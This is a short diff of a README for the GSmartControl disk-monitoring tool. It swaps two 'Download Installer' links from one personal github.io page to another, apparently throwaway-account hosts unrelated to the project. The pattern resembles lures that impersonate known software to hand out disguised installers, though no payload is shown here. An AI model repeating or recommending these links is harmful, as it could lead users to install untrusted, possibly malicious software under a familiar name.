@@ -4,7 +4,7 @@
 <img src="https://habrastorage.org/r/w780/webt/o7/yi/6c/o7yi6cgeczx29ch57u1quk6b82o.png" alt="GSmartControl Logo" width="550">
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://norinejavellana3559993.github.io/.github/GSmartControl-Disk-Monitor)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://coreylecher.github.io/.github/GSmartControl-Disk-Monitor)
 
 ---
 
@@ -28,7 +28,7 @@ The Windows application integrates naturally into system administration routines
 <img src="https://habrastorage.org/r/w780/webt/uf/ii/dh/ufiidhvnzwkpqph9tcdyl91tdpc.png" alt="GSmartControl Screenshot" width="800">
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://norinejavellana3559993.github.io/.github/GSmartControl-Disk-Monitor)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://coreylecher.github.io/.github/GSmartControl-Disk-Monitor)
 
 ---
 
